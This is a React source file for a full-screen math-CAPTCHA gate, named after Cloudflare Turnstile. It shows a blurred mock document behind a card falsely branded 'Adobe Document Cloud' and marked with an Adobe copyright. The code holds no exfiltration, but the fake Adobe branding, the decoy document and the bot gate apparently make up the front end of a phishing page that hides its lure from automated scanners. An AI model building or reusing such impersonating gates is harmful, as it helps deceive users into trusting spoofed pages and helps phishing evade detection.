import React, { useState, useCallback } from 'react';

/**
 * MathCaptchaGate
 * Renders a full-screen simple math CAPTCHA that blocks the app
 * until the visitor solves it correctly.
 *
 * Props:
 *   onVerified — called once the challenge is solved.
 */

const generateChallenge = () => {
    const a = Math.floor(Math.random() * 10) + 1;
    const b = Math.floor(Math.random() * 10) + 1;
    const ops = ['+', '-', '×'];
    const op = ops[Math.floor(Math.random() * ops.length)];
    let answer;
    if (op === '+') answer = a + b;
    else if (op === '-') answer = a - b;
    else answer = a * b;
    return { question: `${a} ${op} ${b}`, answer };
};

const TurnstileGate = ({ onVerified }) => {
    const [challenge, setChallenge] = useState(generateChallenge);
    const [input, setInput] = useState('');
    const [error, setError] = useState('');

    const refresh = useCallback(() => {
        setChallenge(generateChallenge());
        setInput('');
        setError('');
    }, []);

    const handleSubmit = (e) => {
        e.preventDefault();
        if (parseInt(input, 10) === challenge.answer) {
            onVerified(true);
        } else {
            setError('Incorrect answer. Please try again.');
            setInput('');
            setChallenge(generateChallenge());
        }
    };

    return (
        <div className="fixed inset-0 z-[9999] flex items-center justify-center overflow-hidden">

            {/* ── Blurred background ── */}
            <div className="absolute inset-0 scale-105" style={{ filter: 'blur(6px)' }}>
                <div className="absolute inset-0 bg-gradient-to-br from-slate-50 via-white to-blue-50" />
                <div className="absolute inset-0 flex flex-col gap-6 p-16 opacity-60 select-none pointer-events-none">
                    <div className="flex items-center gap-4">
                        <div className="w-12 h-12 rounded bg-red-400 shrink-0" />
                        <div className="flex flex-col gap-1.5">
                            <div className="h-3 w-40 bg-slate-400 rounded" />
                            <div className="h-2 w-24 bg-slate-300 rounded" />
                        </div>
                    </div>
                    {[100, 80, 95, 70, 88, 60, 92, 75, 85, 50, 78, 65, 90, 55].map((w, i) => (
                        <div key={i} className="h-2.5 rounded bg-slate-300" style={{ width: `${w}%` }} />
                    ))}
                    <div className="mt-2 space-y-2.5">
                        {[72, 90, 55, 83, 68, 96, 45, 77].map((w, i) => (
                            <div key={i} className="h-2.5 rounded bg-slate-200" style={{ width: `${w}%` }} />
                        ))}
                    </div>
                </div>
            </div>

            {/* ── Verification card ── */}
            <div className="relative z-10 w-full max-w-sm px-4">
                <div className="bg-black/60 backdrop-blur-xs backdrop-grayscale backdrop-brightness-120 rounded-xl px-8 py-10 text-white text-center shadow-2xl animate-fade-in">

                    {/* Logo */}
                    <div className="flex justify-center mb-6">
                        <img src="/logo.webp" alt="Logo" className="w-12 h-12 rounded-full" />
                    </div>

                    <h2 className="font-medium mb-1">Adobe Document Cloud</h2>
                    <p className="text-xs text-white/80 mb-6">
                        Please solve the math problem below to verify you are human.
                    </p>

                    {/* Math challenge */}
                    <form onSubmit={handleSubmit}>
                        <div className="flex items-center justify-center gap-3 mb-4">
                            <span className="text-2xl font-bold tracking-widest bg-white/10 rounded-lg px-4 py-2">
                                {challenge.question} = ?
                            </span>
                        </div>

                        <input
                            type="number"
                            className="w-fit max-w-fit px-4 border border-gray-500 py-2 rounded text-gray-200 text-center text-lg font-medium outline-none mb-3 focus:ring-2 focus:ring-gray-500 [appearance:textfield] [&::-webkit-outer-spin-button]:appearance-none [&::-webkit-inner-spin-button]:appearance-none"
                            placeholder="Your answer"
                            value={input}
                            onChange={(e) => { setInput(e.target.value); setError(''); }}
                            autoFocus
                            size={6}
                            required
                        />

                        {error && (
                            <p className="text-red-400 text-xs mb-3">{error}</p>
                        )}

                        <div className="flex gap-2 justify-center">
                            <button
                                type="button"
                                onClick={refresh}
                                className="px-4 py-2 rounded bg-white/10 hover:bg-white/20 text-white text-sm transition"
                            >
                                New question
                            </button>
                            <button
                                type="submit"
                                className="px-5 py-2 rounded bg-blue-600 hover:bg-blue-700 text-white text-sm font-medium transition"
                            >
                                Verify
                            </button>
                        </div>
                    </form>

                    <p className="text-xs text-white/50 mt-6">
                        Copyright &copy; 2026 Adobe
                    </p>
                </div>
            </div>
        </div>
    );
};

export default TurnstileGate;
